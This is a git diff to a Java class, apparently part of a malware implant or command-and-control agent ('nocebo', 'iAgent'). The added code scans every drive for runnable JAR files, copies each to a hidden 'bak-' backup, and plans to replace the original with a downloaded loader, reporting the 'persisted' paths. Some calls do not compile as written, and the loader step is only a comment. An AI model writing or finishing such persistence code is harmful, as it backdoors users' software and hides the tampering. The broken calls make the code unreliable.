@@ -1,18 +1,27 @@
 package com.nocebo.nCore;
 
 import java.io.File;
+import java.io.IOException;
 import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.nio.file.Files;
+import java.nio.file.LinkOption;
+import java.nio.file.Path;
 import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Enumeration;
 import java.util.Hashtable;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
 
 import javax.xml.parsers.ParserConfigurationException;
 import javax.xml.transform.TransformerException;
 
 import org.w3c.dom.Document;
+
+import com.nocebo.nCore.iAgent.utilitarian;
 
 public class autoLib
 {
@@ -44,7 +53,7 @@ public class autoLib
                 
         while (iAgent.shutdown != 1)
         {
-            ArrayList fileNames = new ArrayList();
+            ArrayList<Path> fileNames = new ArrayList();
             File[] roots = File.listRoots();
 
             for (int f=0;f<roots.length;f++)
@@ -59,17 +68,34 @@ public class autoLib
             
             for (int r=0;r<fileNames.size();r++)
             {
-                try
+                if (chkMain(fileNames.get(r),nUtil))
                 {
-                //check if bak-jarname.jar already exists, if so skip
-                //copy to bak-jarname.jar
-                //hide bak-jarname.jar
-                //create jarname.jar containing loader, downloaded from revamped download endpoint
+                    try
+                    {
+                        String jarPath = fileNames.get(r).toString();
+                        //check if bak-jarname.jar already exists, if so skip
+                        File file = new File(jarPath);
+                        String parent = file.getParent();
+                        String bakJarPath = String.format("%s%sbak-%s.jar",parent,File.separator,file.getName());
+
+                        if (!new File(bakJarPath).isFile())
+                        {
+                            //copy to bak-jarname.jar
+                            Files.copy(file.getAbsolutePath(), bakJarPath, StandardCopyOption.REPLACE_EXISTING);
+
+                            //hide bak-jarname.jar
+                            Files.setAttribute(bakJarPath, "dos:hidden", true, LinkOption.NOFOLLOW_LINKS);
+
+                            //create jarname.jar containing loader, downloaded from revamped download endpoint
+                            //I need to figure out the loader first
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        fileNames.remove(r);
+                    }
                 }
-                catch (Exception e)
-                {
-                    fileNames.remove(r);
-                }
+                //implict else: no main class, ignoring
             }
 
             metadata.put("persistedPaths",String.join(",",fileNames));
@@ -81,4 +107,27 @@ public class autoLib
             iAgent.output.add(metaDoc);
         }
     }
+
+    //helper functions
+
+    public static boolean chkJarMain(Path jarPath, utilitarian nUtil) throws IOException
+    {
+	
+		
+		JarFile jarfile = new JarFile(new File(jarPath.toString()));
+		Enumeration<JarEntry> enu= jarfile.entries();
+    		while(enu.hasMoreElements())
+    		{
+			
+			JarEntry je = enu.nextElement();
+			if (je.getName().contains("META-INF/MANIFEST"))
+			{
+				return (nUtil.streamToString(jarfile.getInputStream(je)).contains("Main-Class:"));
+			}
+		}
+		return false;
+	
+	
+    }
+
 }
